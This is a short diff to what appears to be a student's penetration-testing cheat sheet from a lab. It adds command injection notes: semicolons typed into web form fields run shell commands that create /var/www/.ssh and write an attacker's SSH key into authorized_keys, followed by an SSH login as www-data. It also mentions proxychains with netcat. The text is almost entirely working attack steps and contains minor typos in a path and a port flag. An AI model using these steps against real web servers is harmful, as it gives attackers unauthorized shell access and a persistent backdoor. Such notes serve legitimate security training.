@@ -77,7 +77,7 @@ proxychains nc (targetip) (taget port)
     </pre>
     </BODY></HTML>
 ### Command injection
-
+use semicolons in test boxes on the webserver
 ##ssh key upload
 ### generate our key
     ssh-keygen -t rsa -b 4096
@@ -90,6 +90,11 @@ make /.ssh in the users home directory
 ;mkdir /var/www/.ssh
 ;ls -la /var/www
 
+### upload key
+    ;echo "ssh key" > /var/www/.ssh/authorized_keys #>> for append
+    ;cat /car/www/.ssh/authorized_keys
+### ssh into machine
+        ssh -i /home/student/.ssh/id_rsa www-data@127.0.0.1 - p1112
     
     
         
